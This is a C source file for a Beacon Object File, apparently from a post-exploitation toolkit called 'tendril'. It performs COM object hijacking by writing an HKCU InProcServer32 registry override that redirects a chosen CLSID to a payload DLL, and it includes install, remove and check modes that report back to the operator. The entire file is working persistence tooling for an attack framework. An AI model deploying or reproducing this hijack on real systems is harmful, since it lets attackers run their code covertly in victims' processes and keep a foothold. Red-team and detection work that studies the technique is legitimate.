/*
 * tendril-com-hijack BOF
 * COM Object Hijacking via HKCU InProcServer32 override
 *
 * Arguments (packed):
 *   wstr clsid    - target CLSID (e.g. "{BCDE0395-E52F-467C-8E3D-C4579291692E}")
 *   wstr dllPath  - path to payload DLL
 *   short action  - 0 = install, 1 = remove, 2 = check
 */
#include "tendril.h"

void go(char* args, int alen)
{
	datap parser;
	BeaconDataParse(&parser, args, alen);

	int clsidLen, dllLen;
	wchar_t* clsid = (wchar_t*)BeaconDataExtract(&parser, &clsidLen);
	wchar_t* dllPath = (wchar_t*)BeaconDataExtract(&parser, &dllLen);
	short action = BeaconDataShort(&parser);

	/* Build registry path: Software\Classes\CLSID\{...}\InProcServer32 */
	wchar_t keyPath[512];
	KERNEL32$lstrcpyW(keyPath, L"Software\\Classes\\CLSID\\");
	KERNEL32$lstrcatW(keyPath, clsid);
	wchar_t keyPathFull[512];
	KERNEL32$lstrcpyW(keyPathFull, keyPath);
	KERNEL32$lstrcatW(keyPathFull, L"\\InProcServer32");

	if (action == 0) /* install */
	{
		LSTATUS s = tendril_reg_set_sz(HKEY_CURRENT_USER, keyPathFull, NULL, dllPath);
		if (s == ERROR_SUCCESS)
		{
			tendril_reg_set_sz(HKEY_CURRENT_USER, keyPathFull, L"ThreadingModel", L"Both");
			BeaconPrintf(CALLBACK_OUTPUT, "[+] COM hijack installed: %ls -> %ls", clsid, dllPath);
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "[-] RegCreateKeyEx failed: %d", s);
		}
	}
	else if (action == 1) /* remove */
	{
		/* Delete InProcServer32 key, then the CLSID key */
		ADVAPI32$RegDeleteKeyExW(HKEY_CURRENT_USER, keyPathFull, KEY_WOW64_64KEY, 0);
		LSTATUS s = ADVAPI32$RegDeleteKeyExW(HKEY_CURRENT_USER, keyPath, KEY_WOW64_64KEY, 0);
		if (s == ERROR_SUCCESS)
			BeaconPrintf(CALLBACK_OUTPUT, "[+] COM hijack removed: %ls", clsid);
		else
			BeaconPrintf(CALLBACK_ERROR, "[-] Removal failed (may not exist): %d", s);
	}
	else /* check */
	{
		HKEY hKey;
		LSTATUS s = ADVAPI32$RegOpenKeyExW(HKEY_CURRENT_USER, keyPathFull, 0,
			KEY_READ | KEY_WOW64_64KEY, &hKey);
		if (s == ERROR_SUCCESS)
		{
			wchar_t data[512] = { 0 };
			DWORD cbData = sizeof(data);
			DWORD type;
			s = ADVAPI32$RegQueryValueExW(hKey, NULL, NULL, &type, (LPBYTE)data, &cbData);
			ADVAPI32$RegCloseKey(hKey);

			if (s == ERROR_SUCCESS)
				BeaconPrintf(CALLBACK_OUTPUT, "[*] HKCU COM override: %ls -> %ls", clsid, data);
			else
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Key exists but no default value for %ls", clsid);
		}
		else
		{
			BeaconPrintf(CALLBACK_OUTPUT, "[*] No HKCU override for %ls", clsid);
		}
	}
}
